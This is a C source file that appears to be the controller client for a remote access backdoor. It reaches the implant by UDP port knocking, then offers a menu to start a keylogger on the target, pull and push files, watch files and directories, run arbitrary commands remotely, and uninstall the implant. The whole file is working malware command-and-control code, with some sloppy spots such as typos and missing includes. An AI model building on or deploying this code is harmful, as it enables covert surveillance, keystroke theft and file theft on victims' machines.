#include "menu.h"
#include "fsm.h"
#include "udp.h"
#include <arpa/inet.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

static void print_menu(void)
{
    printf("\n===== Client Menu =====\n");
    printf("1. Connect\n");

    printf("Select an option: ");
}

static void print_menu_connected(void)
{
    printf("\n===== Client Menu =====\n");
    printf("2. Disconnect\n");
    printf("3. Uninstall\n");
    printf("4. Start Keylogger\n");
    printf("6. Transfer File To Remote\n");
    printf("7. Transfer File From Remote\n");
    printf("8. Watch File\n");
    printf("9. Watch Directory\n");
    printf("10. Run Program\n");
    printf("Select an option: ");
}

menu_option menu_get_selection(int connected)
{
    char  buffer[64];
    long  choice;
    char *end;

    while (1)
    {
        if (connected)
            print_menu_connected();
        else
            print_menu();

        if (!fgets(buffer, sizeof(buffer), stdin))
        {
            printf("Input error.\n");
            continue;
        }

        choice = strtol(buffer, &end, 10);

        if (end == buffer || (*end != '\n' && *end != '\0'))
        {
            printf("Invalid input. Enter a number.\n");
            continue;
        }

        if (choice < 1 || choice > 10)
        {
            printf("Invalid option. Choose 1–10.\n");
            continue;
        }

        return (menu_option)(choice - 1);
    }
}

static int send_udp(const struct ip_info *ctx, const char *msg,
                    size_t msg_len)
{
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0)
    {
        perror("socket");
        return -1;
    }

    if (ctx->src_port > 0)
    {
        struct sockaddr_in src = {0};
        src.sin_family         = AF_INET;
        src.sin_port           = 0;
        src.sin_addr.s_addr    = ctx->local_ip;
        if (bind(sock, (struct sockaddr *)&src, sizeof(src)) < 0)
        {
            perror("bind");
            close(sock);
            return -1;
        }
    }

    struct sockaddr_in dest = {0};
    dest.sin_family         = AF_INET;
    dest.sin_port           = htons(ctx->dest_port);
    dest.sin_addr.s_addr    = ctx->dest_ip;

    if (sendto(sock, msg, msg_len, 0, (struct sockaddr *)&dest, sizeof(dest)) <
        0)
    {
        perror("sendto");
        close(sock);
        return -1;
    }

    close(sock);
    return 0;
}

int port_knock(struct ip_info *ip_ctx)
{
    char  input[1024];
    char *result = NULL;

    int ports[] = {3000, 4000, 5000};

    printf("Enter IP address: ");
    fflush(stdout);

    if (!fgets(input, sizeof(input), stdin))
        return -1;

    input[strcspn(input, "\n")] = '\0';

    if (input[0] == '\0')
    {
        printf("No IP specified.\n");
        return -1;
    }

    uint32_t dest_ip;
    if (inet_pton(AF_INET, input, &dest_ip) != 1)
    {
        printf("Invalid IP address.\n");
        return -1;
    }

    ip_ctx->dest_ip = dest_ip;

    struct ip_info ctx = *ip_ctx;

    for (int i = 0; i < 3; i++)
    {
        ctx.dest_port = ports[i];

        printf("senfing udp\n");
        if (send_udp(&ctx, "hi", 2) != 0)
            return 0;

        // usleep(150000);
    }

    printf("waiting for re\n");
    if (receive_string(*ip_ctx, &result) != 0)
        return -1;

    printf("RESULT: %s\n", result);

    if (!result)
        return 0;

    printf("Received: %s\n", result);

    int success = (strcmp(result, "yY") == 0);

    free(result);

    return success ? 1 : 0;
}

int disconnect(struct ip_info ip_ctx)
{
    send_string(ip_ctx, "2.");

    printf("Disconnected");

    return 0;
}

int uninstall(struct ip_info ip_ctx)
{
    send_string(ip_ctx, "3.");

    printf("Uninstalling...");

    return 0;
}

int start_keylogger(struct ip_info ip_ctx)
{
    char *output = NULL;
    send_string(ip_ctx, "4.");

    receive_string(ip_ctx, &output);

    printf("Choose one of the following: \n%s", output);

    char  buffer[64];
    long  choice;
    char *end;
    int   correct = 0;

    while (correct == 0)
    {
        if (!fgets(buffer, sizeof(buffer), stdin))
        {
            printf("Input error.\n");
            continue;
        }

        choice = strtol(buffer, &end, 10);

        if (end == buffer || (*end != '\n' && *end != '\0'))
        {
            printf("Invalid input. Enter a number.\n");
            continue;
        }

        if (choice < 1 || choice > 10)
        {
            printf("Invalid option. Choose 1–10.\n");
            continue;
        }

        correct = 1;
    }

    char choice_str[32];

    snprintf(choice_str, sizeof(choice_str), "%ld", choice);

    send_string(ip_ctx, choice_str);

    printf("Started keylogger");

    printf("press anything to stop keylogging\n");

    char new_buf[64];
    if (!fgets(new_buf, sizeof(new_buf), stdin))
    {
        printf("Input error.\n");
    }

    send_string(ip_ctx, "wW");

    receive_file(ip_ctx);

    free(output);

    return 0;
}

int stop_keylogger(struct ip_info ip_ctx)
{
    send_string(ip_ctx, "5.");

    printf("Stopped keylogger");

    return 0;
}

int transfer_file(struct ip_info ip_ctx)
{
    char path[1024];

    if (send_string(ip_ctx, "6.") != 0)
        return -1;

    printf("Enter file path to send: ");
    fflush(stdout);

    if (!fgets(path, sizeof(path), stdin))
        return -1;

    path[strcspn(path, "\n")] = '\0';

    if (path[0] == '\0')
    {
        printf("No file specified.\n");
        return -1;
    }

    if (send_file(ip_ctx, path) != 0)
    {
        printf("Failed to send file: %s\n", path);
        return -1;
    }

    printf("File %s sent successfully.\n", path);
    return 0;
}

int request_file(struct ip_info ip_ctx)
{
    char path[1024];

    if (send_string(ip_ctx, "7.") != 0)
        return -1;

    printf("Enter file path to request: ");
    fflush(stdout);

    if (!fgets(path, sizeof(path), stdin))
        return -1;

    path[strcspn(path, "\n")] = '\0';

    if (path[0] == '\0')
    {
        printf("No file specified.\n");
        return -1;
    }

    if (send_string(ip_ctx, path) != 0)
        return -1;

    printf("File %s requested.\n", path);

    receive_file(ip_ctx);
    return 0;
}

static volatile sig_atomic_t g_running = 1;

static int file_exists(const char *p)
{
    struct stat st;
    return (p && stat(p, &st) == 0 && S_ISREG(st.st_mode));
}

static const char *path_basename(const char *path)
{
    if (!path)
        return "";
    const char *slash = strrchr(path, '/');
    return slash ? slash + 1 : path;
}

static void rstrip_newlines(char *s)
{
    if (!s)
        return;
    size_t n = strlen(s);
    while (n > 0 && (s[n - 1] == '\n' || s[n - 1] == '\r'))
    {
        s[--n] = '\0';
    }
}

static int move_file(const char *src, const char *dst_dir)
{
    if (!src || !dst_dir)
        return -1;

    const char *base = path_basename(src);

    if (base[0] == '\0' || strchr(base, '/'))
    {
        errno = EINVAL;
        return -1;
    }

    char dst[PATH_MAX];
    if (snprintf(dst, sizeof(dst), "%s/%s", dst_dir, base) >= (int)sizeof(dst))
    {
        errno = ENAMETOOLONG;
        return -1;
    }

    mkdir(dst_dir, 0755);

    if (rename(src, dst) != 0)
    {
        return -1;
    }
    return 0;
}

static int handle_received_message(const char *msg)
{
    const char *prefix     = "Deleted file: ";
    size_t      prefix_len = strlen(prefix);

    if (!msg)
        return 0;

    char *tmp = strdup(msg);
    if (!tmp)
        return -1;
    rstrip_newlines(tmp);

    if (strncmp(tmp, prefix, prefix_len) != 0)
    {
        free(tmp);
        return 0;
    }

    const char *deleted_path = tmp + prefix_len;
    if (*deleted_path == '\0')
    {
        free(tmp);
        return 0;
    }

    const char *base = path_basename(deleted_path);
    if (base[0] == '\0' || strchr(base, '/'))
    {
        free(tmp);
        return 0;
    }

    char src[PATH_MAX];
    if (snprintf(src, sizeof(src), "./Downloaded/%s", base) >= (int)sizeof(src))
    {
        free(tmp);
        return -1;
    }

    if (file_exists(src))
    {
        if (move_file(src, "./Deleted") != 0)
        {
            free(tmp);
            return -1;
        }
    }

    free(tmp);
    return 1;
}

static void *receive_thread(void *arg)
{
    receiver_args_t *args = (receiver_args_t *)arg;

    while (g_running)
    {
        char *output = NULL;
        char *buffer = NULL;

        receive_string(args->ip_ctx, &output);

        if (strcmp(output, "pP") == 0)
        {
            free(output);
            g_running = 0;
            break;
        }

        receive_string(args->ip_ctx, &buffer);

        printf("%s\n", buffer);

        if (strcmp(output, "aA") == 0)
        {
            receive_file(args->ip_ctx);
        }
        else
        {
            handle_received_message(buffer);
        }

        free(output);
        free(buffer);
    }

    free(args);
    return NULL;
}

static int start_receive_thread(ip_info ip_ctx, pthread_t *thread_out)
{
    pthread_t        tid;
    receiver_args_t *args = malloc(sizeof(*args));
    if (!args)
        return -1;

    args->ip_ctx = ip_ctx;

    if (pthread_create(&tid, NULL, receive_thread, args) != 0)
    {
        free(args);
        return -1;
    }

    if (thread_out)
        *thread_out = tid;

    return 0;
}

static int wait_watch_reply(struct ip_info ip_ctx)
{
    g_running = 1;

    pthread_t tid;

    if (start_receive_thread(ip_ctx, &tid) != 0)
    {
        perror("pthread_create");
    }

    char new_buf[64];
    if (!fgets(new_buf, sizeof(new_buf), stdin))
    {
        printf("Input error.\n");
    }

    send_string(ip_ctx, "wW");

    g_running = 0;
    pthread_join(tid, NULL);

    return 0;
}

int watch_file(struct ip_info ip_ctx)
{
    char path[1024];

    if (send_string(ip_ctx, "8.") != 0)
        return -1;

    printf("Enter file path to watch: ");
    fflush(stdout);

    if (!fgets(path, sizeof(path), stdin))
        return -1;

    path[strcspn(path, "\n")] = '\0';

    if (path[0] == '\0')
    {
        printf("No file specified.\n");
        return -1;
    }

    if (send_string(ip_ctx, path) != 0)
        return -1;

    printf("File %s requested to watch.\n", path);

    wait_watch_reply(ip_ctx);
    return 0;
}

int watch_directory(struct ip_info ip_ctx)
{
    char path[1024];

    if (send_string(ip_ctx, "9.") != 0)
        return -1;

    printf("Enter Directory path to watch: ");
    fflush(stdout);

    if (!fgets(path, sizeof(path), stdin))
        return -1;

    path[strcspn(path, "\n")] = '\0';

    if (path[0] == '\0')
    {
        printf("No file specified.\n");
        return -1;
    }

    if (send_string(ip_ctx, path) != 0)
        return -1;

    printf("Directory %s requested to watch.\n", path);
    wait_watch_reply(ip_ctx);
    return 0;
}

int run_program(struct ip_info ip_ctx)
{
    char  cmd[1024];
    char *result = NULL;

    if (send_string(ip_ctx, "10") != 0)
        return -1;

    printf("Enter command to run: ");
    fflush(stdout);

    if (!fgets(cmd, sizeof(cmd), stdin))
        return -1;

    cmd[strcspn(cmd, "\n")] = '\0';

    if (cmd[0] == '\0')
    {
        printf("No command specified.\n");
        return -1;
    }

    if (send_string(ip_ctx, cmd) != 0)
        return -1;

    if (receive_string(ip_ctx, &result) != 0)
        return -1;

    fputs(result, stdout);

    free(result);
    return 0;
}
